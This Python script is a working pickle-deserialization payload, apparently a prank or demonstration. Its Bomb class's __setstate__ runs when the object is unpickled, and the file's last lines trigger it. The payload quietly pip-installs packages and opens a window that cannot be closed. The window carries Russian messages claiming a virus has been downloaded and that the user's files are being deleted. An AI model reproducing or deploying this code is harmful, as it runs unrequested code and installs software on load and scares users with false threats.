class Bomb:
    def __init__(self, name):
        self.name = name

    def __getstate__(self):
        return self.name

    def __setstate__(self, state):
        self.name = state
        print(f"Bang! From, {self.name}")

        import pip

        def install(package):
            pip.main(['install', package])

        install('pygame')
        install('tkinter')

        import time
        import pygame
        from tkinter import messagebox, Tk

        Tk().wm_withdraw()
        pygame.init()

        pygame.display.set_icon(pygame.image.load('little_skull.png'))
        window = pygame.display.set_mode((850, 450))

        font = pygame.font.SysFont("Lucida Console", 20)
        image = pygame.image.load('little_skull.png')
        message = font.render(f"{"Поздравляю ты загрузил себе ВИРУС":!^60}", True, (0, 0, 0))

        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    time.sleep(0.5)

                    pygame.display.set_icon(pygame.image.load('little_skull.png'))
                    window = pygame.display.set_mode((850, 450))
                    pygame.display.set_caption(f"{"КРИТИЧЕСКАЯ УЯЗВИМОСТЬ!":!^60}")

                    messagebox.showerror("Поздно! Я уже удаляю твои файлы!:)")

            window.fill((253, 230, 28))
            window.blit(image, (240, 0))
            window.blit(message, (50, 400))

            pygame.display.update()


bomb = Bomb('Dmitriy')

import pickle

pickled_bomb = pickle.dumps(bomb, protocol=0)
unpickle_bomb = pickle.loads(pickled_bomb)
